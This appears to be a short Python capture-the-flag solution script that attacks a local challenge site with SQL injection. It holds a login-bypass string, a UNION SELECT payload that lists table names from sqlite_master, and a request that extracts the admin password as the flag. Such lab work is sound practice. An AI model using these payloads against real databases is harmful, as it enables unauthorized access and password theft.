#!/usr/bin/python3

import requests
import os

from urllib.parse import quote,urlencode

url = "http://challenge.localhost/?query="
data = {
"username":"admin",
"user-secret":"1' OR 1=1--"
}
first_i_send_this_to_get_the_table_name = '"+UNION+SELECT+tbl_name+FROM+sqlite_master--'

payload = '"+UNION+SELECT+password+FROM+users_5987994170+WHERE+username=\'admin\'--'
url = url+payload
response = requests.get(url).text

print("The Flag: "+response)
